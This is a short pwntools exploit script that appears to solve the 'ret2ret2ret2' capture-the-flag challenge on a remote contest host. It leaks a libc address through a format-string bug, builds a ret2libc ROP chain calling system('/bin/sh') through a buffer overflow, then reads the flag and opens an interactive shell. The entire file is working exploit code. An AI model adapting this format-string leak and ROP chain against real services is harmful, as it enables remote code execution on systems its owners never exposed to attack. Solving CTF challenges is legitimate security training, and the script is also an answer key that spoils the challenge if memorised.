#!/usr/bin/env python3
from pwn import *

HOST = args.HOST or "ret2ret2ret2-c47-t4.chall.ctf.hackitbraw.site"
PORT = int(args.PORT or 32419)

exe = context.binary = ELF("../dist/ret2ret2ret2", checksec=False)
libc = ELF("../dist/libc.so.6", checksec=False)

io = remote(HOST, PORT)

# %1$p leaks the first extra printf argument, which is puts from libc.
io.sendlineafter(b"format> ", b"%1$p")
io.recvuntil(b"echo> ")
puts_leak = int(io.recvline().strip(), 16)
log.success(f"puts leak: {hex(puts_leak)}")

libc.address = puts_leak - libc.sym["puts"]
log.success(f"libc base: {hex(libc.address)}")

pop_rdi = exe.sym["pop_rdi_ret"]
ret = exe.sym["ret_ret_ret"]
system = libc.sym["system"]
bin_sh = next(libc.search(b"/bin/sh\x00"))

payload = flat(
    b"A" * 72,
    ret,
    ret,
    ret,
    pop_rdi,
    bin_sh,
    system,
)

io.sendafter(b"overflow> ", payload)
io.recvuntil(b"bye\n")
io.sendline(b"cat /tmp/flag")
io.interactive()
